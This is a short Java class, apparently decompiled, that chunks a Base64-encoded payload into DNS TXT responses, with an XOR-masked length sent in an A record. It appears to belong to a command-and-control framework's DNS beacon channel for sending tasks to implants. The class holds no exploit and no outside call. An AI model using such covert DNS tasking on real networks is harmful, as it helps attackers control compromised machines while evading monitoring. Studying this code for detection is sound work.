package beacon.dns;

import common.CommonUtils;
import dns.DNSServer;
import encoders.Base64;

public class SendConversationTXT extends SendConversation {
   protected StringBuffer readme = null;
   protected int maxtxt;

   public SendConversationTXT(String var1, String var2, long var3, int var5) {
      super(var1, var2, var3);
      this.maxtxt = var5;
   }

   public boolean started() {
      return this.readme != null;
   }

   public DNSServer.Response start(byte[] var1) {
      this.readme = new StringBuffer(Base64.encode(var1));
      return DNSServer.A((long)var1.length ^ this.idlemask);
   }

   public DNSServer.Response next() {
      String var1;
      if (this.readme.length() >= this.maxtxt) {
         var1 = this.readme.substring(0, this.maxtxt);
         this.readme.delete(0, this.maxtxt);
         return DNSServer.TXT(CommonUtils.toBytes(var1));
      } else {
         var1 = this.readme.toString();
         this.readme = null;
         return DNSServer.TXT(CommonUtils.toBytes(var1));
      }
   }

   public boolean isComplete() {
      if (this.readme == null) {
         return true;
      } else if (this.readme.length() == 0) {
         CommonUtils.print_stat("readme.length() == 0: certain disaster! (prevented)");
         return true;
      } else {
         return false;
      }
   }
}
